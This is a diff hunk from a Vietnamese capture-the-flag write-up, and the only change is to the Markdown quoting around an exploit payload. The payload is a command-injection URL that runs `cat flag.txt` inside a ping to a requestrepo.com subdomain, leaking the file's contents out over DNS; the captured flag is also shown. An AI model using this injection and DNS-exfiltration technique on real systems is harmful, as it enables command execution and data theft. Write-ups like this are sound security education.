@@ -84,7 +84,7 @@ Sau một hồi fuzz thì mình tìm đến `DNS`, vì hầu như ứng dụng w
 Nhưng mà loay hoay một hồi mình sài lệnh nslookup, dig, host, blabla nó vẫn ko work. Cuối cùng sài lệnh `ping` thì lại oke .
 ## EXPLOIT
 
-` PAYLOAD: http://45.119.84.224:4000/CaptureSite?url[]=$(ping%20`cat%20flag.txt`.ekiajtf3.requestrepo.com)`
+`` PAYLOAD: http://45.119.84.224:4000/CaptureSite?url[]=$(ping%20`cat%20flag.txt`.ekiajtf3.requestrepo.com)``
 
 ` FLAG: ChristCTF{R3v3r53_5h3ll_i5_v3ry_345y_5738246dhcbw}`
 
